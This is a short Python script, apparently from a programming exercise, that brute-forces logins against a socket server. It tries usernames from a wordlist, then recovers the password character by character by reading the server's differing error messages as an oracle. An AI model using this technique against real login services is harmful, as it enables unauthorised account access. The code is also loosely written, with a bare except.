import argparse
import json
import string

char_list = list(string.ascii_letters + string.digits + string.punctuation)


def return_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('ip_address')
    parser.add_argument('port')
    args = parser.parse_args()
    return args


def find_login(client_socket, chunk_size, path):
    with open(path, 'r') as file:
        for login in file:
            login = login.strip('\n')
            json_login = {'login': login, 'password': ''}
            guessed_password: str = ''
            char_index = 0
            while True:
                password = guessed_password
                password += char_list[char_index]
                char_index += 1
                json_login['password'] = password
                message = json.dumps(json_login, indent=4)
                try:
                    client_socket.send(message.encode('utf-8'))
                    response = client_socket.recv(chunk_size).decode('utf-8')
                except:
                    pass
                returned_str = json.loads(response)
                if returned_str['result'] == 'Wrong login!':
                    break
                elif returned_str['result'] == 'Exception happened during login':
                    guessed_password = password
                    char_index = 0
                elif returned_str['result'] == 'Connection success!':
                    return json_login